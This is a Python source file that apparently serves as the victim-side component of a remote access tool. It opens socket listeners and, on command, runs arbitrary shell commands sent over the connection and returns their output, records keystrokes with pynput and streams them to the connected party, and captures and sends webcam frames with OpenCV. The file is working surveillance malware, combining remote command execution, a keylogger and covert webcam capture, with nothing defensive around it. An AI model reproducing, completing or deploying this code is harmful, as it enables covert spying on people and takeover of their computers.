import socket
import pynput.keyboard
import subprocess
import logging
import os
import pickle
import socket
import struct
import cv2

from pynput import keyboard

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65435        # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            choice = conn.recv(1024)
            if(int(choice.decode()) == 1):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as f:
                    f.bind((HOST, 65431))
                    f.listen()
                    conn1, addr = f.accept()
                    with conn1:
                        while True:
                            data = conn1.recv(1024)
                            print(data.decode())
                            if(data.decode() == 'END'):
                                break
                            output = subprocess.check_output(data.decode(), shell=True)
                            conn1.sendall(output)
            if(int(choice.decode()) == 2):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as k:
                    k.bind((HOST, 65432))
                    k.listen()
                    conn2, addr = k.accept()
                    with conn2:
                        logging.basicConfig(filename="log.txt", level=logging.DEBUG, format='')

                        #if the key is a string then do that otherwise turn it into a string
                        def get_key_name(key):
                            if isinstance(key, keyboard.KeyCode): #isinstance(object,type)
                                return key.char
                            else:
                                return str(key)

                        def on_press(key):
                            key_name = get_key_name(key)
                            print('Key {} pressed.'.format(key_name))
                            conn2.send(key_name.encode())
                            logging.log(10, key_name)
                            if key_name == 'Key.esc':
                                print('Exiting...')
                                return False

                        #Start Capturing keystrokes
                        with keyboard.Listener(on_press=on_press) as listener:
                            listener.join()

            if(int(choice.decode()) == 3):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as w:
                    w.bind((HOST, 65433))
                    w.listen()
                    conn3, addr = w.accept()
                    with conn3:
                        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                        while True:
                            ret, frame = cap.read()
                            # Serialize frame
                            data = pickle.dumps(frame)

                            # Send message length first
                            message_size = struct.pack("L", len(data))  ### CHANGED

                            # Then data
                            conn3.sendall(message_size + data)
                            data = conn3.recv(1024)
                            print(data.decode())
                            if (data.decode() == 'END'):
                                break
